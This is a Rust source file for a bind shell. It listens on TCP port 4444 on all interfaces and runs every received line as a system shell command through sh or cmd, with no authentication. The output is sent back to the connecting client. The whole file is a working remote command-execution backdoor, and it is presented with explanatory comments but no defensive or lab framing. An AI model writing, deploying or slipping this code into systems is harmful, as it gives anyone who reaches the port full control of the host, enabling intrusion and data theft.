use std::net::{TcpListener, TcpStream};
use std::io::{self, Write, Read};
use std::process::{Command, Stdio};

// Function to handle client connection
fn handle_client(mut stream: TcpStream) -> io::Result<()> {
    let mut buffer = [0; 1024];  // Buffer to read data from the client

    loop {
        // Read data from the client
        let bytes_read = stream.read(&mut buffer)?;
        if bytes_read == 0 {
            break;  // Connection was closed
        }

        // Convert the buffer to a string (the command)
        let input = String::from_utf8_lossy(&buffer[..bytes_read]);
        let input_trimmed = input.trim(); // Remove trailing newline

        // Log the command being executed
        println!("Executing command: {}", input_trimmed);

        // Execute the command using the system's shell
        let output = if cfg!(target_os = "windows") {
            Command::new("cmd")
                .arg("/C")
                .arg(&input_trimmed)
                .output()
        } else {
            Command::new("sh")
                .arg("-c")
                .arg(&input_trimmed)
                .output()
        };

        // If the command was successfully executed, send the result back to the client
        match output {
            Ok(output) => {
                // Write the command's stdout back to the client
                stream.write_all(&output.stdout)?;
                stream.write_all(&output.stderr)?;  // Also send any error output
            }
            Err(e) => {
                // If an error occurred, send the error message to the client
                let error_msg = format!("Failed to execute command: {}\n", e);
                stream.write_all(error_msg.as_bytes())?;
            }
        }
    }

    Ok(())
}

fn main() -> io::Result<()> {
    // Create a TCP listener to bind on a specific IP and port (e.g., 0.0.0.0:4444)
    let listener = TcpListener::bind("0.0.0.0:4444")?;
    println!("Listening on 0.0.0.0:4444...");

    // Wait for an incoming connection
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                // Handle the incoming connection in a separate function
                println!("New connection from: {:?}", stream.peer_addr());
                handle_client(stream)?;
            }
            Err(e) => {
                // Print any connection error
                println!("Connection failed: {}", e);
            }
        }
    }

    Ok(())
}

